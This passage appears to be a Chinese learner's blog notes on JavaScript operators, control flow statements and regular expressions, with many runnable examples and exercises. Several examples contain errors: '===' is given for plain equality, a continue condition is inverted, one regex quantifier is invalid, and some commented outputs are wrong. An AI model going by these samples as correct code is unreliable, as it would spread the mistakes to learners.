用于进行比较的运算符称作为关系运算符：小于(&lt;)、大于(&gt;)、小于等于(&lt;=)、大于等于(&gt;=)、相等(===)、不等 (!=)、全等(恒等)(===)、不全等(不恒等)(!==) ,返回值只能是true/false。 区分==和=== ==：比较值 ===：比较值和数据类型 和其他运算符一样，当关系运算符操作非数值时要遵循一下规则： 两个操作数都是数值，则数值比较； 两个操作数都是字符串，则比较两个字符串对应的字符编码值； （按位比较，’abcasasasada‘&lt;’az’） A-&gt;65 a-&gt;97 回车-&gt;13 ESC-&gt;27 0-&gt;48 两个操作数都是汉字，比较的是Unicode编码值大小。 求汉字字符串编码charCodeAt() 12console.log(&#x27;张三&#x27;.charCodeAt(0));//求第一个汉字的Unicode编码 24352console.log(&#x27;李四&#x27;.charCodeAt(0));//求第一个汉字的Unicode编码 26446 两个操作数有一个是数值，则将另一个转换为数值，再进行数值比较； boolean与数值 string与数值 两个操作数有一个是对象，则先调用valueOf()方法或toString()方法，再用结果比较； 码值：部分符号&lt;数字&lt;大写字母&lt;小写字母&lt;汉字 符号之间不能有空格 123456789&lt;script type=&quot;text/javascript&quot;&gt; var box = 3 &gt; 2; //true var box = 3 &gt; 22; //false var box = &#x27;3&#x27; &gt; 22; //false var box = &#x27;3&#x27; &gt; &#x27;22&#x27;; //true var box = &#x27;a&#x27; &gt; &#x27;b&#x27;; //false a=97,b=98 var box = &#x27;a&#x27; &gt; &#x27;B&#x27;; //true B=66 var box = 1 &gt; &#123;&#125;; //false&lt;/script&gt; 14.5.4 逻辑运算符逻辑运算符介绍 逻辑运算符通常用于布尔值的操作，一般和关系运算符配合使用，有三个逻辑运算符：逻辑与(AND)、逻辑或 (OR)、逻辑非(NOT)。 返回逻辑值true/false或者其他值。 1．逻辑与(AND) ：&amp;&amp; 逻辑与运算符属于短路操作，顾名思义，如果第一个操作数返回是false，第二个数不管是true还是false都返回的false。 注意： 如果两个操作数中任意一个操作数非逻辑值，第一个操作数的结果为false时，返回第一个操作数 如果两个操作数中任意一个操作数非逻辑值，第一个操作数的结果为true时，返回第二个操作数 注意 2．逻辑或(OR)：|| 两边只要有一边是true，返回true。也有短路操作，第一个true，第二个操作数就不再考虑了。 注意： 如果两个操作数中任意一个操作数非逻辑值，第一个操作数的结果为true时，返回第一个操作数 如果两个操作数中任意一个操作数非逻辑值，第一个操作数的结果为false时，返回第二个操作数 3．逻辑非(NOT)：! 逻辑非运算符可以用于任何值。无论这个值是什么数据类型，这个运算符都会返回一个布尔值。它的流程是： 先将这个值转换成布尔值，然后取反。 注意： 12345对象或数组，不管有没有值，都转换为true(实际上取的是地址)console.log(!&#123;&#125;); //falseconsole.log(![]); //falseconsole.log(!&#123;key:&#x27;abc&#x27;&#125;);//falseconsole.log(![1,2,3]);//false 1234console.log(!123);// false 非0数值将自动转换为trueconsole.log(!0);// true 0数值将自动转换为falseconsole.log(!&#x27;abc&#x27;);// false 非空字符串自动转换为trueconsole.log(!&#x27;&#x27;);// true 空字符串自动转换为false 12345&lt;script type=&quot;text/javascript&quot;&gt; var box = (5 &gt; 4) &amp;&amp; (4 &gt; 3); //true，两边都为true，返回true var box = (9 &gt; 7) || (7 &gt; 8); //true，两边只要有一边是true，返回true var box = !(5 &gt; 4); //false&lt;/script&gt; 短路运算 &amp;&amp;运算时，如果第一个操作数为false，不需要计算第二个数，结果返回false。 ||运算时，如果第一个操作数为true，不需要计算第二个数，结果返回true。 1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; /*&amp;&amp;运算符*/ console.log(123&amp;&amp;0);//0 console.log(123&amp;&amp;&#x27;abc&#x27;);//abc console.log(0&amp;&amp;132);//0 console.log(0&amp;&amp;&#x27;&#x27;);//0 // /*||运算符*/ console.log(123||0);// 123 console.log(0||&#x27;abc&#x27;);// abc console.log(0||132);// 132 console.log(0||&#x27;&#x27;);// &#x27;&#x27; console.log(&#x27;&#x27;||0);// 0 console.log(&#x27;&#x27;||123);// 123 /*!运算符*/ &lt;/script&gt;&lt;/html&gt; 14.5.5 三元运算符什么是三元运算符 /条件运算符三元条件运算符其实就是后面将要学到的if语句的简写形式。 123&lt;script type=&quot;text/javascript&quot;&gt; var box = 5 &gt; 4 ? &#x27;对&#x27; : &#x27;错&#x27;; //对，5&gt;4返回true则把&#x27;对&#x27;赋值给box，反之。&lt;/script&gt; A?B:C：如果A，那么B，否则C。 14.6 流程控制语句什么是流程控制语句ECMA-262规定了一组流程控制语句。语句定义了ECMAScript中的主要语法，语句通常由一个或者多个关键字 来完成给定的任务。诸如：判断、循环、退出等。 14.6.1 if语句1．if (条件表达式) 语句if语句是基于条件成立才执行相应代码时使用的语句 2．if (条件表达式) {语句;} else {语句;}if…else语句是在指定的条件成立时执行代码，在条件不成立时执行else后的代码。 12345678&lt;script type=&quot;text/javascript&quot;&gt; var box = 100; if (box &gt; 50) &#123; alert(&#x27;box大于50&#x27;); //条件为true，执行这个代码块 &#125; else &#123; alert(&#x27;box小于50&#x27;); //条件为false，执行这个代码块 &#125;&lt;/script&gt; 3．if (条件表达式) {语句;} else if (条件表达式) {语句;} ..．else {语句;}要在多组语句中选择一组来执行，使用if..else嵌套语句。 12345678910&lt;script type=&quot;text/javascript&quot;&gt; var box = 100; if (box &gt;= 90) &#123; //如果满足条件，不会执行下面任何分支 alert(&#x27;优秀&#x27;); &#125; else if (box &gt;= 60) &#123; alert(&#x27;及格&#x27;); &#125; else &#123; //如果以上都不满足，则输出不及格 alert(&#x27;不及格&#x27;); &#125;&lt;/script&gt; 14.6.2 switch语句switch语句介绍switch语句是多重条件判断，用于多个值相等的比较。 123456789101112&lt;script type=&quot;text/javascript&quot;&gt; var box = window.prompt(); switch (box) &#123; //用于判断box相等的多个值 case 1 : alert(&#x27;one&#x27;); break; //break;用于防止语句的穿透 case 2 : alert(&#x27;two&#x27;); break; default : //相当于if语句里的else，否则的意思 alert(&#x27;error&#x27;); &#125;&lt;/script&gt; 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var box = window.prompt(&#x27;输入一个数字&#x27;);//保存数据类型，string //或者直接var box = prompt(&#x27;&#x27;);也可以 console.log(box); console.log(typeof (box)); switch (box) &#123; //用于判断box相等的多个值,如果输入的是非数字，那么将转换为true case &#x27;1&#x27; : alert(&#x27;one&#x27;); break; //break;用于防止语句的穿透 case &#x27;2&#x27; : alert(&#x27;two&#x27;); break; default : //相当于if语句里的else，否则的意思 alert(&#x27;error&#x27;); &#125; &lt;/script&gt;&lt;/html&gt; 1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var score =parseInt(prompt(&quot;Enter a score&quot;)); var res = &#x27;&#x27;; switch (Math.floor(score / 10)) &#123;//向下取整 case 0: case 1: case 2: case 3: case 4: case 5: res = &#x27;fail&#x27;; break; case 6: res = &#x27;pass&#x27;; break; case 7: case 8: res = &#x27;Well done&#x27;; break; case 9: res = &#x27;Excellent&#x27;; break; case 10: res = &#x27;Full Marks!&#x27;; break; default: res = &#x27;Please enter correct score!&#x27; &#125; console.log(score); alert(res); &lt;/script&gt;&lt;/html&gt; 14.6.3 do…while语句do…while语句介绍do…while语句是一种先运行，后判断的循环语句。也就是说，不管条件是否满足，至少先运行一次循环体。 14.6.4 while语句while语句介绍while语句是一种先判断，后运行的循环语句。也就是说，必须满足条件了之后，方可运行循环体。 14.6.5 for语句for语句介绍for语句也是一种先判断，后运行的循环语句。但它具有在执行循环之前初始变量和定义循环后要执行代码的 能力。 14.6.6 break和continue语句break和continue语句介绍 break和continue语句用于在循环中精确地控制代码的执行。其中，break语句会立即退出循环，强制继续执 行循环体后面的语句。而continue语句退出当前循环，继续后面的循环。(不用于forEach()中) 123456789&lt;script type=&quot;text/javascript&quot;&gt; for (var box = 1; box &lt;= 10; box++) &#123; if (box == 5) break; //如果box是5，就退出循环 //continue; //如果box是5，就退出当前循环 document.write(box); document.write(&#x27;&lt;br /&gt;&#x27;); &#125;&lt;/script&gt; 14.8 实训 判断一个年份是闰年还是平年，闰年：能被4整除，但不能被100整除的年份 或者 能被400整除的年份。 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var year = parseInt(prompt(&#x27;Enter a year:&#x27;)); if(isNaN(year))&#123; alert(&#x27;Please enter a year!&#x27;); &#125; if(year%4===0&amp;&amp;year%100!==0)&#123; alert(year + &#x27; is leap year.&#x27;); &#125; else if(year%400===0)&#123; alert(year + &#x27; is leap year.&#x27;); &#125;else &#123; alert(year + &#x27; is not leap year.&#x27;); &#125; &lt;/script&gt;&lt;/html&gt; 计算1-100之间所有数的和。 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var sum = 0; for(var i = 1;i&lt;=100;i++)&#123; sum += i; &#125; document.write(&#x27;1+^……+100 = &#x27;+ sum) &lt;/script&gt;&lt;/html&gt; 编写一个程序，计算增加后的工资。要求工龄满5，增加20%工资；若2—5，则增加15%；若小于2，则增加 10%工资。 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var work_years = prompt(&#x27;Enter your work year:&#x27;), salary = parseInt(prompt(&#x27;Enter your salary:&#x27;)); if (work_years &lt; 2) &#123; salary = salary + salary * 0.1 &#125; else if (work_years &lt; 5) &#123; salary = salary + salary * 0.15 &#125; else if (work_years &gt; 5) &#123; salary = salary + salary * 0.2 &#125;else &#123; document.write(&#x27;Please enter correct data&#x27;); &#125; document.write(&#x27;Your salary is &#x27; + salary); &lt;/script&gt;&lt;/html&gt; 求1-100之间不能被7整除的整数的和（用continue）。 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var sum = 0; for(var i = 100;i &gt;= 1;i--)&#123; if(i%7 !== 0) continue; sum += i; document.write(&#x27;Sum is &#x27; + sum) &#125; document.write(&#x27;Sum is &#x27; + sum) &lt;/script&gt;&lt;/html&gt; 求200-300之间第一个能被7整数的数（break） 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; for(var i = 200;i &lt;= 300;i++)&#123; if(i%7===0) break; &#125; document.write(&#x27;This first answer is &#x27; + i); &lt;/script&gt;&lt;/html&gt; 扩展 将值转换为INT型parseInt()/整数型parseFloat() Math.floor():向下取整 用JS向HTML中写入标签：document.write(‘&lt;br/&gt;‘) for …… in用于遍历数组/对象，forEach()用于遍历数组。","categories":[],"tags":[{"name":"JS","slug":"JS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JS/"}]},{"title":"JS正则表达式","slug":"前端学习17","date":"2021-05-22T07:15:23.000Z","updated":"2021-10-11T09:35:17.582Z","comments":true,"path":"2021/05/22/前端学习17/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/05/22/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A017/","excerpt":"","text":"后盾人的文档 JS中的正则表达式基础知识正则表达式是用于匹配字符串中字符组合的模式，在 JavaScript中，正则表达式也是对象。 正则表达式是在宿主环境下运行的，如js/php/node.js 等 本章讲解的知识在其他语言中知识也是可用的，会有些函数使用上的区别 对比分析与普通函数操作字符串来比较，正则表达式可以写出更简洁、功能强大的代码。 下面使用获取字符串中的所有数字来比较函数与正则的差异。 1234567//过滤字符串中的数字 let hd = &#x27;zhangjjiiallllliiiiinnnnn132&#x27;; // console.log([...hd]);//展开成一个数组。 // console.log(isNaN(hd)); let nums = [...hd].filter(a=&gt;!Number.isNaN(parseInt(a))); console.log(nums); console.log(nums.join(&#x27;&#x27;));//连接数字 12//正则方法 console.log(hd.match(/\\d/g).join(&#x27;&#x27;)); 创建正则JS提供字面量与对象两种方式创建正则表达式 字面量创建使用//包裹的字面量创建方式是推荐的作法，但它不能在其中使用变量 12let mk = &quot;miketaylor.com&quot;;console.log(/u/.test(mk));//true 下面尝试使用 a 变量时将不可以查询 1234567891011&lt;script&gt; // 操作变量进行正则匹配 let mk = &quot;miketaylorjuly123.cn&quot;; let site= &quot;t&quot;; let a = &quot;t&quot;; console.log(/t/.test(mk)); // true console.log(/site/.test(mk)); // false console.log(/a/.test(mk)); //false , 测试的是a,不是t console.log(eval(`/$&#123;a&#125;/`).test(mk));//eval()可以把字符串变成JS表达式&lt;/script&gt; 对象创建当正则需要动态创建时使用对象方式。 123456789 //对象创建正则表达式 let mk = &#x27;miketaylorjuly123.cn&#x27;; let test1 = &#x27;u&#x27;; let reg1 = new RegExp(&#x27;u&#x27;,&#x27;g&#x27;); let reg2 = new RegExp(test1 ,&#x27;g&#x27;); console.log(reg1.test(mk));// true console.log(reg2.test(mk));// true ，可以识别变量&lt;/script&gt; 字符串替换： 123456789&lt;script&gt;//字符串替换 console.log(&quot;abcd&quot;.replace(&#x27;ab&#x27;,&#x27;@@&#x27;));//把字符串后脏的下字母替换成@@ console.log(&quot;_a_b_c_d_&quot;.replace(/\\w/g,&#x27;@@&#x27;)); console.log(&quot;_a_b_c_d_&quot;.replace(/\\w/g,search =&gt; &#123; return &#x27;@@&#x27;; &#125;));&lt;/script&gt; 根据用户输入高亮显示内容，支持用户输入正则表达式： 12345678910&lt;script&gt; const mk = prompt(&#x27;请输入要检测的内容，支持则正则&#x27;); const reg = new RegExp(mk, &quot;g&quot;); let body = document .querySelector(&#x27;#content&#x27;) .innerHTML.replace(reg, search =&gt; &#123; return `&lt;span style=&quot;color:#ff0000&quot;&gt;$&#123;search&#125;&lt;/span&gt;`; &#125;); document.body.innerHTML = body;&lt;/script&gt; 通过对象创建正则提取标签 12345678910111213&lt;body&gt; &lt;h1&gt;miketaylor.com&lt;/h1&gt; &lt;h1&gt;miketaylorjuly123.cn&lt;/h1&gt;&lt;/body&gt;&lt;script&gt;function element(tag) &#123; const html = document.body.innerHTML; let reg = new RegExp(&quot;&lt;(&quot; + tag + &quot;)&gt;.+&lt;/\\\\1&gt;&quot;, &quot;g&quot;); return html.match(reg);&#125;console.table(element(&quot;h1&quot;));&lt;/script&gt; | 这个符号带表选择修释符，也就是 | 左右两侧有一个匹配到就可以。 检测电话是否是上海或北京的坐机 123456let tel = &quot;010-12345678&quot;;//错误结果：只匹配 | 左右两边任一结果console.log(tel.match(/010|020\\-\\d&#123;7,8&#125;/)); //正确结果：所以需要放在原子组中使用console.log(tel.match(/(010|020)\\-\\d&#123;7,8&#125;/)); 匹配字符是否包含miketaylor.cn 或 miketayulorjuly123.cn 字符转义转义用于改变字符的含义，用来对某个字符有多种语义时的处理。 假如有这样的场景，如果我们想通过正则查找/符号，但是 /在正则中有特殊的意义。如果写成///这会造成解析错误，所以要使用转义语法 /\\//来匹配。 字符边界使用字符边界符用于控制匹配内容的开始与结束约定。 ^ 匹配字符串的开始 $ 匹配字符串的结束，忽略换行符 检测用户名长度为3~6位，且只能为字母。如果不使用 ^与$ 限制将得不到正确结果。 123456789101112131415161718192021&lt;body&gt; &lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt; &lt;span&gt;&lt;/span&gt;&lt;/body&gt;&lt;script&gt; let mk = &#x27;miketaylorjuly123.cn&#x27;; //匹配字符串包含数字与否 console.log(/\\d/.test(mk)); //匹配字符串开头是数字与否 console.log(/^\\d/.test(mk)); //匹配字符串结尾是数字与否 console.log(/\\d$/.test(mk)); //匹配字符串是否全由数字组成 console.log(/\\d$/.test(mk)); // 限定起始结束匹配 document.querySelector(&quot;[name = &#x27;user&#x27;]&quot;).addEventListener(&quot;keyup&quot;,function ()&#123; let flag = this.value.match(/^[a-z]&#123;3,6&#125;$/)//限定匹配3-6位的小写英文字母。 document.querySelector(&quot;span&quot;).innerHTML = flag?&quot;正确&quot;:&quot;错误&quot;; &#125;);&lt;/script&gt; 元字符元字符是正则表达式中的最小元素，只代表单一（一个）字符 字符列表 元字符 说明 示例 \\d 匹配任意一个数字 [0-9] \\D 与除了数字以外的任何一个字符匹配 [^0-9] \\w 与任意一个英文字母,数字或下划线匹配 [a-zA-Z_] \\W 除了字母,数字或下划线外与任何字符匹配 [^a-zA-Z_] \\s 任意一个空白字符匹配，如空格，制表符\\t，换行符\\n [\\n\\f\\r\\t\\v] \\S 除了空白符外任意一个字符匹配 [^\\n\\f\\r\\t\\v] . 匹配除换行符外的任意字符 123456789101112131415161718192021222324&lt;script&gt; mk = &quot;miketaylor 2021&quot;; // console.log(mk.match(/\\d\\d\\d\\d/)); console.log(mk.match(/\\d+/g)); // 多个数字匹配 //匹配电话号 // \\d匹配数字 let info = `张三:010-20012932233,李四:020-2020321355`; console.log(info.match(/\\d&#123;3&#125;-\\d+/g)); //g参数，一直扫描到结尾，返回0个或多个结果 console.log(info.match(/[-\\d:,]/g)); // 匹配[]中的所有元素并输出 console.log(info.match(/[-\\d:,]+/g)); // 连续匹配[]中的所有元素并输出 console.log(info.match(/[^-\\d:,]/g)); // 匹配除了[]中的所有元素并输出 console.log(info.match(/[^-\\d:,]+/g)); // 连续匹配除了[]中的所有元素并输出 // \\D与除了数字以外的任何一个字符匹配 let mk2 = &quot;miketaylor 2021&quot;; console.log(mk2.match(/\\D+/g)); //g参数，一直扫描到结尾，返回0个或多个结果 // \\s 任意一个空白字符匹配，如空格，制表符`\\t`，换行符`\\n` console.log(/\\s/.test(mk2)); // \\S 除了空白符外任意一个字符匹配 console.log(mk2.match(/\\S+/g));&lt;/script&gt; 12345678910111213141516&lt;script&gt; let mk = &quot;miketaylorjuly123.cn&quot;; // \\w与任意一个英文字母,数字或下划线匹配 console.log(mk.match(/\\w+/g)); // 邮箱匹配 let email = &quot;3105085561@qq.com&quot;; console.log(email.match(/^\\w+@\\w+\\.\\w+$/g)); // \\W除了字母,数字或下划线外与任何字符匹配 console.log(&#x27;jiajialingongzhang@gmail.com&#x27;.match(/\\W/g)); // 用户名匹配：5-10位，a-z开头5 let username = prompt(&quot;Enter your username&quot;); console.log(/^[a-z]\\w&#123;4,9&#125;$/.test(username));&lt;/script&gt; 123456789101112131415161718192021&lt;script&gt; //.匹配除换行符外的任意字符 let mk = &quot;miketaylorjuly123.cn-+!@#$@$#%%^%$&amp;^&quot;; console.log(mk.match(/.+/g)); // 网址匹配 let my_site = &quot;https://miketaylorjuly123.cn&quot;; console.log(my_site.match(/https?:\\/\\/\\w+\\.\\w+/g)); let my_site2 = ` https://miketaylorjuly123.cn https://www.baidu.com `; console.log(my_site2.match(/.+/s)[0]);// s模式：把匹配对象视为单行/把换行符当做普通空白使用。 // 空格处理 let tel = &#x27;155 8322 3946&#x27;; console.log(tel.match(/\\d+ \\d+ \\d+/)); // 或console.log(tel.match(/\\d+\\s\\d+\\s\\d+/));&lt;/script&gt; 匹配任何字符 12345&lt;script&gt; // 匹配所有字符[\\s\\S] [\\d\\D] [\\w\\W] [.\\s] let mk = &quot;mik1123%$#@!#%%^&amp;%^&amp;*()|&lt;&gt;,./;&#x27;[]|*/~`etaylorjuly123.cn&quot;; console.log(/[\\s\\S]+/.test(mk));&lt;/script&gt; 模式修饰正则表达式在执行时会按他们的默认执行方式进行，但有时候默认的处理方式总不能满足我们的需求，所以可以使用模式修正符更改默认方式。 修饰符 说明 i 不区分大小写字母的匹配 g 全局搜索所有匹配内容 m 视为多行 s 视为单行忽略换行符，使用. 可以匹配所有字符 y 从 regexp.lastIndex 开始匹配 u 正确处理四个字符的 UTF-16 编码 模式g与模式i 12345678910111213&lt;script&gt; //模式i let mk = &quot;miketaylorjuly123.cnV&quot;; console.log(mk.match(/v/)); console.log(mk.match(/v/i)); //模式g let mk2 = &quot;miketVaVyVloVrjVuly1V23.VcVn&quot;; console.log(mk2.match(/v/gi)); // 混合使用。 // 利用模式匹配实现替换 console.log(mk2.replace(/v/gi , &#x27;@&#x27;));&lt;/script&gt; m多行匹配修正符实例 将以 #数字开始的课程解析为对象结构 123456789101112131415&lt;script&gt; let mk = ` #1 Data Structure,90 # #2 Computer Network,90 # #3 Operation system,85 # 张云 #4 Artificial Vision,100 # `; //希望提取结构[&#123;course_name:&#x27;&#x27;,scores:&#x27;&#x27;,&#125;]，需要过滤掉”# 张云“项 let lessons = mk.match(/\\s*#\\d\\s+.+#$/gm).map(v=&gt;&#123; v = v.replace(/\\s*#\\d+\\s+/,&#x27;&#x27;).replace(/\\s#/,&#x27;&#x27;); [name,price] = v.split(&#x27;,&#x27;); return &#123;name ,price&#125;; &#125;) console.log(JSON.stringify(lessons,null,2));&lt;/script&gt; 汉字与字符属性 每个字符都有属性，如L属性表示是字母，P 表示标点符号，需要结合 u 模式才有效。其他属性简写可以访问 属性的别名 (opens new window)网站查看。 123let mk = &quot;miketaylorjuly123.加加林，冲冲冲。&quot;; console.log(mk.match(/\\p&#123;L&#125;/gu));// 匹配中英文字 console.log(mk.match(/\\p&#123;P&#125;/gu)); //匹配标点符号 字符也有Unicode文字系统属性 Script=文字系统，下面是使用 \\p&#123;sc=Han&#125; 获取中文字符 han为中文系统，其他语言请查看 文字语言表 1234let hd = `张三:010-99999999,李四:020-88888888`;let res = hd.match(/\\p&#123;sc=Han&#125;+/gu);console.log(res); 使用 u 模式可以正确处理四个字符的 UTF-16 字节编码 1234let str = &quot;𝒳𝒴&quot;;console.table(str.match(/[𝒳𝒴]/)); //结果为乱字符&quot;�&quot;console.table(str.match(/[𝒳𝒴]/u)); //结果正确 &quot;𝒳&quot; lastIndexRegExp对象lastIndex 属性可以返回或者设置正则表达式开始匹配的位置 必须结合 g 修饰符使用 对 exec 方法有效 匹配完成时，lastIndex 会被重置为0 123456789101112131415161718192021222324&lt;script&gt; //lastIndex let mk = &#x27;miketaylorjuly123.cn&#x27;; let reg = /\\w/g; console.log(mk.match(reg)); //无法保留主信息 //注意：必须/g进入全局属性 console.log(reg.lastIndex); //0 console.log(reg.exec(mk)); //m console.log(reg.lastIndex); //1 console.log(reg.exec(mk)); //i console.log(reg.lastIndex); //2 console.log(reg.exec(mk)); //k console.log(reg.lastIndex); //3 console.log(reg.exec(mk)); //e console.log(reg.lastIndex); //4 console.log(reg.exec(mk)); //t console.log(reg.lastIndex); //9 //遍历 while((res = reg.exec(mk)))&#123; console.log(res); &#125;&lt;/script&gt; y我们来对比使用 y 与g 模式，使用 g 模式会一直匹配字符串。 提高检索大文档的效率。 12345678910111213&lt;script&gt; // g let mk = &#x27;lovemikelovetaylor&#x27;; let reg = /l/g; console.log(reg.exec(mk)); console.log(reg.lastIndex); //1 console.log(reg.exec(mk)); console.log(reg.lastIndex); //9 console.log(reg.exec(mk)); console.log(reg.lastIndex); // 16 console.log(reg.exec(mk)); console.log(reg.lastIndex); // 0&lt;/script&gt; 12345678910111213&lt;script&gt; // g let mk = &#x27;lovemikelovetaylor&#x27;; let reg = /l/y; console.log(reg.exec(mk)); console.log(reg.lastIndex); //1 console.log(reg.exec(mk)); console.log(reg.lastIndex); //0 console.log(reg.exec(mk)); console.log(reg.lastIndex); // 1 console.log(reg.exec(mk)); console.log(reg.lastIndex); // 0&lt;/script&gt; 因为使用 y 模式可以在匹配不到时停止匹配，在匹配下面字符中的qq时可以提高匹配效率。 1234567 let hd = `铁憨憨QQ号:11111111,999999999,88888888，我将不断学习，并且称为全栈！`;let reg = /(\\d+),?/y;let qq = [];reg.lastIndex = 7;while ((res = reg.exec(hd))) qq.push(res[1]);console.log(qq); 原子表在一组字符中匹配某个元字符，在正则表达式中通过元字符表来完成，就是放到[] (方括号)中。 使用语法 原子表 说明 [] 只匹配其中的一个原子 [^] 只匹配”除了”其中字符的任意一个原子 [0-9] 匹配0-9任何一个数字 [a-z] 匹配小写a-z任何一个字母 [A-Z] 匹配大写A-Z任何一个字母 实例操作使用[]匹配其中任意字符即成功，下例中匹配ue任何一个字符，而不会当成一个整体来对待。 12345&lt;script&gt; let mk = &quot;miketaylorjuly123.cn&quot;; console.log(/kt/.test(mk)); //f console.log(/[kt]/.test(mk)); //t&lt;/script&gt; 日期匹配 12345&lt;script&gt; // 日期的匹配 let date = &quot;2022/02/23&quot;; console.log(date.match(/^\\d&#123;4&#125;([-\\/])\\d&#123;2&#125;\\1\\d&#123;2&#125;$/)); // 这里使用了原子组，取组用\\1，目的是防止前/后-这类事故。&lt;/script&gt; 区间匹配 0-3匹配 12const num = &quot;2&quot;;console.log(/[0-3]/.test(num)); //true 匹配a~f间的任意字符 12const hd = &quot;e&quot;;console.log(/[a-f]/.test(hd)); //true 顺序为升序否则将报错 12const num = &quot;2&quot;;console.log(/[3-0]/.test(num)); //SyntaxError 字母也要升序否则也报错 12const hd = &quot;houdunren.com&quot;;console.log(/[f-a]/.test(hd)); //SyntaxError 12const hd = &quot;houdunren.com&quot;;console.log(/[f-a]/.test(hd)); //SyntaxError 验证用户名，要求数字开头，后面数字下划线字母，4-7位 123456789&lt;body&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/body&gt;&lt;script&gt; let input = document.querySelector(`[name=&quot;username&quot;]`); input.addEventListener(&#x27;keyup&#x27;,function()&#123; console.log(this.value.match(/^[a-z]\\w+&#123;3,6&#125;$/i)); // i不区分大小写 , 4- 7位 &#125;);&lt;/script&gt; 排除匹配 1234let hd = `张三:010-99999999,李四:020-88888888`;let res = hd.match(/[^:\\d-,]+/g); // 放在第一个位置不用转义，而-不在第一个，要转义console.log(res); 原子表中有些正则字符不需要转义，如果转义也是没问题的，可以理解为在原子表中. 就是小数点。 1234567&lt;script&gt; let str = &quot;(miketaylorjuly123.cn)+&quot;; console.table(str.match(/[().+]/g)); //使用转义也没有问题 console.table(str.match(/[\\(\\)\\.\\+]/g));&lt;/script&gt; 下面是使用原子表知识删除所有标题 1234567891011&lt;body&gt; &lt;p&gt;憨憨&lt;/p&gt; &lt;h1&gt;miketaylorjuly123.cn&lt;/h1&gt; &lt;h2&gt;baidu.fanyi.com&lt;/h2&gt;&lt;/body&gt;&lt;script&gt; const body = document.body; const reg = /&lt;(h[1-6])&gt;[\\s\\S]*&lt;\\/\\1&gt;*/gi; let content = body.innerHTML.replace(reg, &quot;&quot;); document.body.innerHTML = content;&lt;/script&gt; 匹配所有内容 12345678&lt;script&gt; let mk = ` miketaylor Juile `; console.log(mk.match(/.+/gs)); // s模式忽略换行符 console.log(mk.match(/[\\S\\s]+/gs)); // 匹配所有内容&lt;/script&gt; 原子组 如果一次要匹配多个元子，可以通过元子组完成 原子组与原子表的差别在于原子组一次匹配多个元子，而原子表则是匹配任意一个字符 元字符组用 () 包裹 下面使用原子组匹配 h 标签。 123456789&lt;script&gt; let mk = ` &lt;h1&gt;miketaylorjuly&lt;/h1&gt; &lt;h2&gt;Linux&lt;/h2&gt; `; let reg = /&lt;(h[1-6])&gt;[\\s\\S]*&lt;\\/\\1&gt;/i; //原子组 \\1 \\2 \\3取出原子组 console.log(mk.match(reg));&lt;/script&gt; 基本使用没有添加 g 模式修正符时只匹配到第一个，匹配到的信息包含以下数据 变量 说明 0 匹配到的完整内容 1,2…. 匹配到的原子组 index 原字符串中的位置 input 原字符串 groups 命名分组 在match中使用原子组匹配，会将每个组数据返回到结果中 0 为匹配到的完成内容 1/2 等 为原子级内容 index 匹配的开始位置 input 原始数据 groups 组别名 邮箱匹配 1234567891011121314&lt;body&gt; &lt;input type=&quot;text&quot; name=&quot;mail&quot; value=&quot;23134565556@qq.com&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;website&quot; value=&quot;miketaylorjuly123@qq.com.cn&quot;&gt;&lt;/body&gt;&lt;script&gt; let mail = document.querySelector(`[name = &quot;mail&quot;]`).value; let website = document.querySelector(`[name = &quot;website&quot;]`).value; let reg = /^[\\w-]+@[\\w-]+\\.(com|org|cc|cn|net)$/i; // 必须用原子组，不然单纯的com或cc也能直接匹配 console.log(mail.match(reg)); let reg_pro = /^[\\w-]+@([\\w-]+\\.)+(com|org|cc|cn|net)$/i;//改良 console.log(website.match(reg_pro));&lt;/script&gt; 邮箱匹配并输出结果 123456789101112&lt;body&gt; &lt;input type=&quot;text&quot; name=&quot;website&quot; value=&quot;miketaylorjuly123@qq.com.cn&quot;&gt; &lt;span&gt;&lt;/span&gt;&lt;/body&gt;&lt;script&gt; let website = document.querySelector(`[name = &quot;website&quot;]`).addEventListener(&quot;keyup&quot;,function()&#123; let reg_pro = 